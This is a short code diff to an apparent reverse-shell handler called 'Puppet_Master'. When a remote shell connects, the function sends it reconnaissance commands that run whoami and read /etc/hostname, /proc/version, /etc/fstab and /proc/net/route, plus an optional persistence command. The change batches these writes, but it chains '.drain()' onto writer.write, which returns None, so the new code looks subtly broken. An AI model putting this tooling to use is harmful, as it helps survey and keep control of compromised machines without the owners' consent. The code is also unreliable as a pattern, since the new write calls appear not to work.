@@ -74,12 +74,16 @@ async def handle_shell_init(reader, writer):
     randomStringWhoamiSuffix = randomString()
     randomStringHostnamePrefix = randomString()
     randomStringHostnameSuffix = randomString()
-    writer.write( f"echo {randomStringWhoamiPrefix} && whoami && echo {randomStringWhoamiSuffix}\n".encode() )
-    writer.write( f"echo {randomStringHostnamePrefix} && cat /etc/hostname && echo {randomStringHostnameSuffix}\n".encode() )
-    writer.write( f"echo {randomStringPrefix} && whoami && cat /proc/version /etc/fstab /proc/net/route && echo {randomStringSuffix}\n".encode() )
+    init_command = str()
+    init_command += f"echo {randomStringWhoamiPrefix} && whoami && echo {randomStringWhoamiSuffix}\n"
+    init_command += f"echo {randomStringHostnamePrefix} && cat /etc/hostname && echo {randomStringHostnameSuffix}\n"
+    init_command += f"echo {randomStringPrefix} && whoami && cat /proc/version /etc/fstab /proc/net/route && echo {randomStringSuffix}\n"
+    await writer.write( init_command.encode() ).drain()
+
     if Puppet_Master.Persistence:
         writer.write( Puppet_Master.PersistenceCommand.encode() + "\n".encode() )
-    writer.write( "echo Puppet\n".encode() )
+
+    await writer.write( "echo Puppet\n".encode() ).drain()
 
     while True:
         try:
